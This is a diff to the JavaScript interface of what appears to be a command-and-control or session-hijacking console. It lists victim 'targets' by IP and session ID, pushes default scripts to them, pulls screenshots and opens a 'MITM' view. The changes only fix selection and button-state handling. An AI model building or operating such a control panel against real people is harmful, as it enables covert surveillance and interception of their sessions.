@@ -1,5 +1,11 @@
 var clients = {}
 var currentClient = null
+var currentClientSid = null
+var initializedClients = {}
+
+function mitmButtonIdForSid(sid) {
+    return `mitmButton-${sid.replace(/[^a-zA-Z0-9_-]/g, '_')}`;
+}
 
 async function loadClientList() {
     try {
@@ -12,7 +18,7 @@ async function loadClientList() {
         for (const index in clients) {
             const client = clients[index];
             const item = document.createElement('div');
-            item.className = `client-item ${currentClient === index ? 'active' : ''}`;
+            item.className = `client-item ${currentClientSid === client.sid ? 'active' : ''}`;
 
             item.innerHTML = `
                 <div class="client-info">
@@ -20,12 +26,22 @@ async function loadClientList() {
                     <span class="sid">SID: ${client.sid.substring(0, 8)}...</span>
                 </div>
                 <div class="client-actions">
-                    <button id="mitmButton-${index}" class="btn-mitm" disabled="" onclick="window.open('${client.mitmUrl}', '_blank'); event.stopPropagation();">MITM</button>
+                    <button id="${mitmButtonIdForSid(client.sid)}" class="btn-mitm" disabled="" onclick="window.open('${client.mitmUrl}', '_blank'); event.stopPropagation();">MITM</button>
                 </div>
             `;
 
             item.onclick = () => selectClient(index);
             clientList.appendChild(item);
+        }
+
+        if (currentClientSid) {
+            const selectedExists = Object.values(clients).some(c => c.sid === currentClientSid);
+            if (!selectedExists) {
+                currentClient = null;
+                currentClientSid = null;
+                document.getElementById('terminalPrompt').textContent = 'no-target@console:~$';
+                document.getElementById('previewStatus').textContent = 'Target: disconnected';
+            }
         }
     } catch (e) {
         console.error("Failed to load clients", e);
@@ -33,21 +49,33 @@ async function loadClientList() {
 }
 
 async function selectClient(index) {
-    currentClient = index;
-    // Update UI active state
     const client = clients[index];
+    if (!client) {
+        return;
+    }
+
+    currentClient = index;
+    currentClientSid = client.sid;
+    // Update UI active state
     const shortSid = client.sid.substring(0, 8);
     document.getElementById('terminalPrompt').textContent = `${shortSid}@${client.ip}:~$`;
     document.getElementById('previewStatus').textContent = `Target: ${client.ip}`;
 
     await sendConsole("change " + index);
-    loadDefaultScripts().then(() => {
-        sendConsole("screenshot").then(() => {
-            document.getElementById('previewImage').src = `screenshots/${clients[index].sid}.png?t=${Date.now()}`;
-        }).then(() => {
-            document.getElementById(`mitmButton-${index}`).disabled = false;
-        });
-    });
+
+    if (!initializedClients[currentClientSid]) {
+        await loadDefaultScripts();
+        initializedClients[currentClientSid] = true;
+    }
+
+    await sendConsole("screenshot");
+    if (currentClientSid === client.sid) {
+        document.getElementById('previewImage').src = `screenshots/${client.sid}.png?t=${Date.now()}`;
+        const mitmButton = document.getElementById(mitmButtonIdForSid(client.sid));
+        if (mitmButton) {
+            mitmButton.disabled = false;
+        }
+    }
 }
 
 function togglePreview() {
